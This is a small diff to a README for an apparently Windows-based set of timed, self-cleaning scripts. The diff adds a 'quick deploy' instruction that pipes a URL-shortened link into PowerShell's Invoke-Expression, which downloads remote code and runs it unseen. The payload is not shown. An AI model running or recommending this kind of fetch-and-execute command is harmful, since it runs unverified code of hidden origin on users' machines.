@@ -6,6 +6,8 @@ The timed scripts are not persistent, they clean up after themselves once run.
 
 ## One time run
 
+Quick deploy (instant version) via powershell: "irm https://is.gd/droptestjck1 | iex"
+
 ## 📂 Filepaths & Structure
 To deploy, ensure these files are in the same folder before running the initiator:
 - `[Current_Folder]\setup.bat` (The Initiator)
